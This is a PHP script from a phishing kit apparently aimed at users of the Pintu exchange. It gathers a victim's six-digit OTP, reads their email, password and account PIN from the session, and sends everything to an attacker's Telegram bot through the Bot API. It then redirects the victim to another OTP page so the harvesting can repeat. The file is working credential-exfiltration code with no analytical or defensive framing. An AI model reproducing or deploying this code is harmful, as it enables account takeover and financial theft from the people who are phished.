<?php

session_start();
include "./tele.php";

$otp1 = $_POST['otp1'];
$otp2 = $_POST['otp2'];
$otp3 = $_POST['otp3'];
$otp4 = $_POST['otp4'];
$otp5 = $_POST['otp5'];
$otp6 = $_POST['otp6'];
$_otp = $otp1.$otp2.$otp3.$otp4.$otp5.$otp6;
$phone_number        = $_SESSION['phoneNumber'];
$email                = $_SESSION['email'];
$password                = $_SESSION['password'];
$_pin                = $_SESSION['acc_pin'];

$message = "
├• Pintu | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 | ".$email."
├───────────────────
├• *Username* : ".$email."
├• *Password* : ".$password."
╰───────────────────
• PIN AKUN : ".$_pin."
• OTP : ".$_otp."
──────────────────────";

function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $token_bot);
header('Location: ../otp.html');
?>